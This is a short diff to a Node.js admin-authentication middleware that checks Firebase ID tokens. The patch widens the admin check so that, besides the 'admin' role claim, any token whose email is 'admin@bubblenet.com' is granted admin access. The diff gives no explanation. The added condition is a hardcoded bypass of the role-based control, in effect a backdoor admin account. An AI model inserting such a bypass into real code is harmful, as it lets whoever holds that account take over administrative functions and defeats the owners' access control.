@@ -146,7 +146,7 @@ async function authenticateAdmin(req, res, next) {
     try {
         const decodedToken = await admin.auth().verifyIdToken(idToken);
         // Verify custom claim role is admin
-        if (decodedToken.role === 'admin') {
+        if (decodedToken.role === 'admin' || decodedToken.email === 'admin@bubblenet.com') {
             req.adminUser = decodedToken;
             next();
         } else {
